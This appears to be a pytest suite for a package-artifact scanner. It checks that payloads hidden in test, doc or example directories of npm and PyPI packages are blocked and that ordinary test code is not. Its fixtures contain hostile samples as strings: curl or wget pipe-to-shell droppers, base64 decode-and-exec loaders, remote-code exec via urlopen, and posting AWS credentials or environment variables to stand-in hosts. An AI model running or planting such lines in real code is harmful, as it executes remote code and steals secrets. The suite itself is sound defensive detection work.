"""Test / doc / example dirs inside a published artifact are read for payloads.

A tests/ dir in an npm tarball or a wheel is installed next to the runtime code, which
can import it (`from evilpkg.tests import go`). The artifact scan used to skip every
test / doc file, so a payload parked there read as zero findings. Payload-shaped
findings there now keep their severity and block; everything else is informational
(no score, no review, no block) and those files do not count toward files_scanned.
"""
from __future__ import annotations

import pytest

from src.scanner.artifact_fetch import ArtifactFetchResult, _make_file, _member_class
from src.scanner.artifact_scan import scan_artifact_files
from src.scanner.exec_classify import inline_code_is_payload
from src.scanner.scan import (
    ScanResult,
    _finding_is_blocking,
    _scan_content,
    apply_artifact_scan,
    finding_is_shipped,
)


def _fetched(files: dict[str, str], eco: str = "pypi") -> ArtifactFetchResult:
    fetched = ArtifactFetchResult(ecosystem=eco, name="evilpkg", version="1",
                                  kind="sdist" if eco == "pypi" else "tarball", ok=True)
    for p, body in files.items():
        fetched.files[p] = _make_file(p, body.encode())
    return fetched


def _artifact(files: dict[str, str], eco: str = "pypi"):
    findings, n, _hook = scan_artifact_files(_fetched(files, eco))
    return findings, n


def _blocking(findings):
    return [f for f in findings
            if f.severity in ("critical", "high") and _finding_is_blocking(f)]


def _non_blocking_only(findings):
    """No finding blocks and nothing is above medium."""
    return (not _blocking(findings)
            and all(f.severity not in ("critical", "high") for f in findings
                    if f.kind == "defect"))


def _informational_only(findings):
    """A test / doc file's non-payload findings: info defects only, no capabilities."""
    return all(f.kind == "defect" and f.severity == "info" and not f.payload
               for f in findings)


# ── Recall: payloads in a test dir block ───────────────────────────────────────

class TestPayloadInTestDirBlocks:
    def test_imported_tests_package_dropper(self):
        findings, n = _artifact({
            "evilpkg/__init__.py": "from evilpkg.tests import go\n",
            "evilpkg/tests/__init__.py": (
                "import os\n\ndef go():\n    pass\n\n"
                "os.system('curl -s x.example.test/i | sh')\n"),
        })
        blocking = _blocking(findings)
        assert blocking, findings
        assert all(f.file_path == "evilpkg/tests/__init__.py" for f in blocking)
        assert all(f.payload and finding_is_shipped(f) for f in blocking)
        assert n == 1  # runtime files only: thin coverage measures runtime code

    def test_decode_exec_in_tests_dir(self):
        findings, _ = _artifact({
            "evilpkg/tests/helpers.py": (
                "import base64\n"
                "blob = 'aW1wb3J0IG9z'\n"
                "code = base64.b64decode(blob)\n"
                "exec(code)\n"),
        })
        blocking = _blocking(findings)
        assert blocking, findings
        assert any("obfuscated loader" in f.name or "decoded" in f.name.lower()
                   for f in blocking)

    def test_one_line_decoded_exec_in_tests_dir(self):
        findings, _ = _artifact({
            "evilpkg/tests/__init__.py":
                "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n",
        })
        assert _blocking(findings), findings

    def test_credential_exfil_in_tests_dir(self):
        findings, _ = _artifact({
            "evilpkg/tests/conftest.py": (
                "import os, requests\n"
                "key = open(os.path.expanduser('~/.aws/credentials')).read()\n"
                "requests.post('https://x.example.test/c', data={'credential': key})\n"),
        })
        blocking = _blocking(findings)
        assert blocking, findings
        assert blocking[0].category == "exfiltration"

    def test_env_dump_exfil_in_tests_dir(self):
        findings, _ = _artifact({
            "evilpkg/tests/__init__.py":
                "import os, requests\nrequests.post('https://x.example.test', json=os.environ)\n",
        })
        assert _blocking(findings), findings

    def test_js_tests_dir_execsync_pipe_to_shell(self):
        findings, _ = _artifact({
            "lib/__tests__/index.test.js": (
                "const { execSync } = require('child_process');\n"
                "execSync('curl -s https://x.example.test/i | sh');\n"),
        }, eco="npm")
        blocking = _blocking(findings)
        assert blocking, findings
        assert all(f.payload for f in blocking)

    def test_examples_dir_payload_blocks_too(self):
        findings, _ = _artifact({
            "evilpkg/examples/__init__.py":
                "import os\nos.system('wget -qO- https://x.example.test/i | bash')\n",
        })
        assert _blocking(findings), findings

    def test_python_inline_code_that_fetches_and_runs(self):
        findings, _ = _artifact({
            "evilpkg/tests/test_x.py": (
                "import subprocess, sys\n"
                "subprocess.run([sys.executable, '-c', "
                "'import urllib.request as u; exec(u.urlopen(\"https://x.example.test\").read())'])\n"),
        })
        assert _blocking(findings), findings

    def test_provider_token_in_tests_dir_is_reported_at_full_severity(self):
        findings, _ = _artifact({
            "evilpkg/tests/settings.py":
                'TOKEN = "ghp_' + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8" + '"\n',
        })
        blocking = _blocking(findings)
        assert blocking and blocking[0].category == "secret", findings

    def test_not_installed_test_file_stays_info(self):
        """An sdist test file absent from the wheel never reaches a consumer."""
        fetched = _fetched({
            "evilpkg/__init__.py": "x = 1\n",
            "tests/test_x.py": "import os\nos.system('curl -s x.example.test/i | sh')\n",
        })
        fetched.installed_paths = {"evilpkg/__init__.py"}
        findings, _n, _h = scan_artifact_files(fetched)
        assert findings and all(f.severity == "info" for f in findings if f.kind == "defect")
        assert not _blocking(findings)
        assert not any(f.payload or finding_is_shipped(f) for f in findings)

    def test_js_tests_dir_vm_runs_decoded_code(self):
        findings, _ = _artifact({
            "test/helpers.js": (
                "const vm = require('vm');\n"
                "const blob = 'Y29uc29sZS5sb2coMSk=';\n"
                "vm.runInNewContext(Buffer.from(blob, 'base64').toString(), {});\n"),
        }, eco="npm")
        assert _blocking(findings), findings

    def test_js_tests_dir_vm_constant_script_is_not_a_payload(self):
        findings, _ = _artifact({
            "test/helpers.js": (
                "const vm = require('vm');\n"
                "vm.runInNewContext(\"require('assert')\", {require});\n"),
        }, eco="npm")
        assert _non_blocking_only(findings), findings


# ── Precision: ordinary test suites stay non-blocking ──────────────────────────

class TestOrdinaryTestDirsStayNonBlocking:
    def test_tests_dir_running_pytest(self):
        findings, n = _artifact({
            "evilpkg/tests/test_cli.py": (
                "import subprocess\n\n"
                "def test_cli():\n"
                "    subprocess.run(['pytest', '-q'], check=True)\n"),
        })
        assert n == 0
        assert _informational_only(findings), findings

    def test_tests_dir_shell_true_runner(self):
        findings, _ = _artifact({
            "evilpkg/tests/test_build.py": (
                "import subprocess\n\n"
                "def test_build(tmp_path):\n"
                "    subprocess.check_call('make -C ' + str(tmp_path), shell=True)\n"),
        })
        assert _informational_only(findings), findings

    def test_conftest_env_use(self):
        findings, _ = _artifact({
            "evilpkg/tests/conftest.py": (
                "import os\nimport pytest\n\n"
                "TOKEN = os.environ.get('API_TOKEN', '')\n"
                "os.environ['HOME'] = '/tmp/home'\n\n"
                "@pytest.fixture\ndef token():\n    return os.getenv('SECRET_KEY')\n"),
        })
        assert _informational_only(findings), findings

    def test_fixture_with_fake_keys(self):
        findings, _ = _artifact({
            "evilpkg/tests/fixtures/keys.py": (
                'AWS = "AKIAIOSFODNN7EXAMPLE"\n'
                'PEM = """-----BEGIN RSA PRIVATE KEY-----\n'
                "MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\n"
                "KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQJAIJLixBy2qpFoS4DSmoEm\n"
                '-----END RSA PRIVATE KEY-----"""\n'),
        })
        assert _informational_only(findings), findings

    def test_inline_pickle_roundtrip_is_not_a_payload(self):
        """pandas' test_downstream: `python -OO -c "import pickle; …"` stays medium."""
        findings, _ = _artifact({
            "evilpkg/tests/test_downstream.py": (
                "import subprocess, sys\n"
                "subprocess.check_call([sys.executable, '-OO', '-c', "
                "'import pandas as pd, pickle; pickle.loads(pickle.dumps(pd.Series()))'])\n"),
        })
        assert _informational_only(findings), findings

    def test_builtins_namespace_lookup_is_not_a_payload(self):
        """numpy's test_api: `getattr(__builtins__, '__dict__', __builtins__)`."""
        findings, _ = _artifact({
            "evilpkg/tests/test_api.py":
                "builtins = getattr(__builtins__, '__dict__', __builtins__)\n",
        })
        assert _informational_only(findings), findings

    def test_obfuscated_builtin_call_is_a_payload(self):
        findings, _ = _artifact({
            "evilpkg/tests/__init__.py":
                "getattr(__builtins__, 'ex' + 'ec')(open('/tmp/x').read())\n",
        })
        assert _blocking(findings), findings

    def test_pipe_to_shell_in_a_yaml_fixture_is_text(self):
        findings, _ = _artifact({
            "evilpkg/tests/fixtures/workflow.yml":
                "steps:\n  - run: curl -s https://x.example.test/i | sh\n",
        })
        assert _informational_only(findings), findings

    def test_auth_post_in_a_test_is_not_exfil(self):
        findings, _ = _artifact({
            "evilpkg/tests/test_auth.py": (
                "import requests\n\n"
                "def test_login(server):\n"
                "    requests.post(server.url, data={'password': 'hunter2'})\n"),
        })
        assert _informational_only(findings), findings

    def test_infra_file_keeps_plain_downgrade(self):
        """Payload exemption is for test / doc / example dirs only, not CI recipes."""
        findings, _ = _artifact({
            ".github/scripts/setup.sh": "curl -s https://x.example.test/i | sh\n",
        }, eco="npm")
        assert _non_blocking_only(findings), findings


# ── The repo scan is unchanged ─────────────────────────────────────────────────

def test_repo_scan_still_downgrades_payloads_in_tests():
    findings, _, _ = _scan_content(
        "import os\nos.system('curl -s x.example.test/i | sh')\n", "pkg/tests/test_x.py")
    assert findings
    assert not _blocking(findings)
    assert not any(f.payload for f in findings)


def test_runtime_file_findings_carry_no_payload_flag():
    findings, _, _ = _scan_content(
        "import os\nos.system('curl -s x.example.test/i | sh')\n", "pkg/run.py",
        payloads_full_severity=True)
    assert _blocking(findings)
    assert not any(f.payload for f in findings)


# ── Coverage stays honest ──────────────────────────────────────────────────────

def test_files_scanned_counts_runtime_files_only():
    result = ScanResult(repo="pypi:evilpkg", stars=0, description="", framework="")
    apply_artifact_scan(result, "pypi", _fetched({
        "evilpkg/__init__.py": "x = 1\n",
        "evilpkg/tests/__init__.py": "",
        "evilpkg/tests/test_a.py": "def test_a():\n    assert True\n",
        "docs/conf.py": "project = 'x'\n",
    }))
    # Test / doc files are read for payloads but thin coverage measures runtime code.
    assert result.files_scanned == 1
    assert result.total_scannable_files == 1
    assert not result.sampled


def test_test_suite_noise_does_not_move_the_score():
    from src.scanner.scan import _calculate_trust_score

    runtime = {f"evilpkg/m{i}.py": f"def f{i}():\n    return {i}\n" for i in range(10)}

    def _score(files):
        result = ScanResult(repo="pypi:evilpkg", stars=0, description="", framework="")
        apply_artifact_scan(result, "pypi", _fetched(files))
        return _calculate_trust_score(result), result.files_scanned

    noisy = dict(runtime)
    noisy["evilpkg/tests/test_build.py"] = (
        "import subprocess, pickle\n"
        "subprocess.check_call('make -C ' + str(1), shell=True)\n"
        "pickle.load(open('x', 'rb'))\n")
    noisy["evilpkg/tests/fixtures/keys.py"] = (
        'PEM = """-----BEGIN RSA PRIVATE KEY-----\n'
        "MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\n"
        '-----END RSA PRIVATE KEY-----"""\n')
    assert _score(noisy) == _score(runtime)


@pytest.mark.parametrize("path,scannable", [
    ("pkg/tests/test_a.py", False),
    ("lib/__tests__/a.test.js", False),
    ("docs/conf.py", False),
    ("pkg/tests/data/blob.bin", False),
    ("pkg/core.py", True),
])
def test_member_class_partial_flag_tracks_runtime_source(path, scannable):
    assert _member_class(path)[1] is scannable


@pytest.mark.parametrize("code,payload", [
    ("import pickle; pickle.loads(pickle.dumps(1))", False),
    ("import requests; print(requests.__version__)", False),
    ("import ctypes; ctypes.CDLL(None)", False),
    ("import os; os.system('curl -s x | sh')", True),
    ("import urllib.request as u; exec(u.urlopen('h').read())", True),
    ("import base64; exec(base64.b64decode('eA=='))", True),
])
def test_inline_code_is_payload(code, payload):
    assert inline_code_is_payload(code) is payload
